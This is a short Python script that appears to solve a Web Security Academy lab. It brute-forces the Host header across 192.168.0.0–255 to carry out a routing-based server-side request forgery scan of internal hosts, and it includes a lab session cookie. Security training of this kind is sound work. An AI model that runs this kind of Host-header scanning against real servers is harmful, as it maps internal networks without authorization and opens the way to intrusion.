import requests

url = 'https://ac931fce1fd40692c22cb301009700e3.web-security-academy.net/'

def SSRF():
    for i in range(0, 256):
        response = requests.get(url, headers={
            'Host': '192.168.0.' + str(i)
        }, cookies={
            '_lab': '48%7cMC4CFQCQz6IIPbUORQTHWOS7hBUXrDYR8gIVAIqbUo%2fGEEGcpflcol7358Q4RgZZ3zNjEoOIGMARjaMzscw6icf18ZynqhdyGXSlhKPBEvQbHFOiFp95cNCG3%2bELl2R8cFnQWhZB2SooFqotdnmqY%2f1ePidK9HAlgF%2bYFKM39jYKH4uohQ%3d%3d'
        }, allow_redirects=False)

        if response.status_code != 504:
            print(i)
            print(response.text)
            print(response.status_code)
            break

SSRF()